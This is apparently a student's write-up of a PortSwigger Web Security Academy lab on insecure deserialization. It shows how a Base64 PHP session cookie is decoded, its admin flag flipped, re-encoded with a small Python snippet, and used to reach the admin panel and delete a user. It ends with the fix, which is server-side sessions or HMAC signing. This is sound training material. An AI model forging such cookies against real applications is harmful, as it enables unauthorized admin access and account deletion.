# Insecure Deserialization Lab 1 — Modifying serialized objects — PortSwigger

**Platform:** PortSwigger Web Security Academy (free lab)
**Topic:** Insecure Deserialization
**Lab:** Modifying serialized objects
**Difficulty:** Apprentice
**Solved:** 27 November 2026 ~09:40 PKT (banner verified on the instance home page)
**Account:** Arbaz Ahmed Naveed
**Instance:** https://0a2a001e041911f6808a26f500450029.web-security-academy.net/
**Exploit server:** None (no exploit server shown for this lab)

## Vulnerability Type

Insecure deserialization — the session cookie holds a Base64-encoded serialized PHP `User` object that the server unserializes on every request. The object's attributes (including the `admin` flag) are fully attacker-controlled because the cookie is not signed or validated.

## Solution

1. Logged in as `wiener:peter` and inspected the session cookie. Decoded (Base64-decode) it is a serialized PHP object:
   ```
   O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}
   ```
2. The `admin` attribute is a boolean `b:0` (false). Flipped it to `b:1` (true):
   ```
   O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}
   ```
3. Base64-encoded the modified object, URL-encoded the result, and replaced the session cookie with it (script `~/workspace/scripts/ps-deserialization.py 1`):
   ```python
   import base64, urllib.parse
   obj = b'O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}'
   cookie = urllib.parse.quote(base64.b64encode(obj).decode(), safe="")
   ```
4. Sent `GET /my-account` with the forged cookie — the page now showed the `/admin` link, confirming the server trusted the tampered object.
5. Sent `GET /admin/delete?username=carlos` to delete the user Carlos.
6. Verified on the instance home page: **"Congratulations, you solved the lab!"**

## Practical Explanation

Serialization turns an object into a flat string so it can be stored (here, in a cookie) and rebuilt later. If the application unserializes data the user controls without verifying it, the attacker can simply edit the serialized string — here, changing one boolean from false to true turned a normal user into an administrator. There is no need to find a gadget chain or exploit a magic method: the application trusts the object's own attributes. The fix is to never trust serialized data from the client — store session state server-side, or sign the serialized data (HMAC) and verify the signature *before* unserializing.

## Lessons Learned

- Always decode the session cookie first: a serialized object in a cookie is a direct invitation to tamper with it.
- A single boolean flip (`b:0` → `b:1`) is enough when the application makes authorization decisions from deserialized attributes.
- Verify the solve on the banner, not on the admin page alone — the delete request returning HTTP 200 is not proof by itself.
